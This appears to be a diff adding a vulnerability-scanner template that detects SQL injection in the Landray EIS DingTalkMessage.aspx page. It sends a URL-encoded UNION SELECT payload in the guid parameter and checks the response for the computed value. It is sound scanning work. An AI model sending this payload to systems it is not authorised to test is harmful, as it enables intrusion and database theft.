@@ -1,0 +1,18 @@
+id: landray-eis-dingtalkmessage-sqli
+
+info:
+  name: 蓝凌EIS DingTalkMessage.aspx SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /third/DingTalk/Pages/DingTalkMessage.aspx?redirectUrl=12&guid=550e8400-e29b-41d4-a716-446655440000%27%20UNION%20ALL%20SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20VARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28113%29--%20Zald HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"12321")
+
